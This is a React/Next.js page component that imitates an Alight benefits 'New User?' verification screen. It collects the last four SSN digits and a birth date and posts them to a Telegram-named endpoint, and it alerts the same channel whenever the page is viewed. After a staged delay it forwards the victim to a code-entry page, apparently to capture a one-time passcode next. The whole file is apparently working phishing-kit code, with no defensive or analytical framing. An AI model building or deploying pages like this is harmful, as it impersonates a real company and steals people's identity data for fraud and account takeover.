"use client"

import { useState, useEffect, useRef } from "react"
import { useRouter } from "next/navigation"
import { HelpCircle } from "lucide-react"
import { Button } from "@/components/ui/button"
import { SiteFooter } from "@/components/site-footer"
import { VerificationHeader } from "@/components/verification-header"
import { Input } from "@/components/ui/input"
import { Checkbox } from "@/components/ui/checkbox"
import { MONTHS, DAYS, YEARS } from "@/lib/date-constants"

export default function NewUserPage() {
  const router = useRouter()
  const [ssnLast4, setSsnLast4] = useState("")
  const [month, setMonth] = useState("")
  const [day, setDay] = useState("")
  const [year, setYear] = useState("")
  const [privacyAccepted, setPrivacyAccepted] = useState(false)
  const [isLoading, setIsLoading] = useState(false)

  const ssnDigits = ssnLast4.replace(/\D/g, "")
  const isSsnValid = ssnDigits.length === 4
  const isDateValid = month && day && year
  const isFormValid = isSsnValid && isDateValid && privacyAccepted
  const hasNotifiedView = useRef(false)

  useEffect(() => {
    if (hasNotifiedView.current) return
    hasNotifiedView.current = true
    fetch("/api/telegram/new-user-view", { method: "POST" }).catch(console.error)
  }, [])

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    if (!isFormValid || isLoading) return
    setIsLoading(true)
    try {
      await fetch("/api/telegram/new-user", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          ssnLast4: ssnDigits,
          birthDate: `${month} ${day}, ${year}`,
        }),
      }).catch(console.error)
    } catch (err) {
      console.error("New user notification error:", err)
    }
    await new Promise((r) => setTimeout(r, 7000))
    router.push("/new-user-code")
  }

  return (
    <div className="min-h-screen bg-white flex flex-col">
      <VerificationHeader />
      <div className="max-w-2xl px-4 py-10 mb-[270px] mx-auto md:mx-0 md:ml-[60px] flex-1">
        <div className="flex items-center gap-2 mb-2">
          <h1 className="text-2xl font-semibold text-gray-900">New User?</h1>
          <button
            type="button"
            className="text-[#254650] hover:underline flex items-center gap-1"
            aria-label="Help"
          >
            <HelpCircle className="w-4 h-4" />
            <span className="text-sm">Help</span>
          </button>
        </div>
        <p className="text-gray-700 text-sm mb-6">
          You&apos;ll need to set up your logon information. First, though, enter these details to confirm your identity.
        </p>

        <form onSubmit={handleSubmit} className="space-y-5">
          <div>
            <label htmlFor="ssn" className="block text-sm font-medium text-gray-900 mb-1.5">
              Last 4 Digits of SSN
            </label>
            <Input
              id="ssn"
              type="text"
              inputMode="numeric"
              maxLength={4}
              value={ssnLast4}
              onChange={(e) => setSsnLast4(e.target.value.replace(/\D/g, "").slice(0, 4))}
              placeholder=""
              className="max-w-[140px] h-10 bg-gray-50 border-gray-300 rounded-md"
            />
          </div>

          <div>
            <label className="block text-sm font-medium text-gray-900 mb-1.5">Birth Date</label>
            <div className="flex gap-2 flex-wrap">
              <select
                value={month}
                onChange={(e) => setMonth(e.target.value)}
                className="h-10 px-3 bg-gray-50 border border-gray-300 rounded-md text-sm text-gray-900 min-w-[120px]"
              >
                <option value="">Month</option>
                {MONTHS.map((m) => (
                  <option key={m} value={m}>{m}</option>
                ))}
              </select>
              <select
                value={day}
                onChange={(e) => setDay(e.target.value)}
                className="h-10 px-3 bg-gray-50 border border-gray-300 rounded-md text-sm text-gray-900 min-w-[80px]"
              >
                <option value="">Day</option>
                {DAYS.map((d) => (
                  <option key={d} value={d}>{d}</option>
                ))}
              </select>
              <select
                value={year}
                onChange={(e) => setYear(e.target.value)}
                className="h-10 px-3 bg-gray-50 border border-gray-300 rounded-md text-sm text-gray-900 min-w-[90px]"
              >
                <option value="">Year</option>
                {YEARS.map((y) => (
                  <option key={y} value={y}>{y}</option>
                ))}
              </select>
            </div>
          </div>

          <div className="flex items-start gap-2">
            <Checkbox
              id="privacy"
              checked={privacyAccepted}
              onCheckedChange={(c) => setPrivacyAccepted(c === true)}
              className="mt-0.5 border-gray-400"
            />
            <label htmlFor="privacy" className="text-sm text-gray-700 cursor-pointer select-none">
              To continue, check here to accept the{" "}
              <a href="#" className="text-[#254650] hover:underline font-medium">Alight Privacy Policy.</a>
            </label>
          </div>

          <div className="flex gap-3 pt-2">
            <Button
              type="submit"
              disabled={!isFormValid || isLoading}
              className="bg-[#254650] hover:bg-[#1e383f] text-white rounded-md h-9 px-5 text-sm font-medium disabled:bg-gray-300 disabled:text-gray-500 disabled:pointer-events-none"
            >
              {isLoading ? "Loading..." : "Continue"}
            </Button>
            <Button
              type="button"
              className="bg-gray-600 hover:bg-gray-700 text-white border-0 rounded-md h-9 px-5 text-sm font-medium"
              onClick={() => router.push("/")}
            >
              Cancel
            </Button>
          </div>
        </form>
      </div>

      <SiteFooter />
    </div>
  )
}
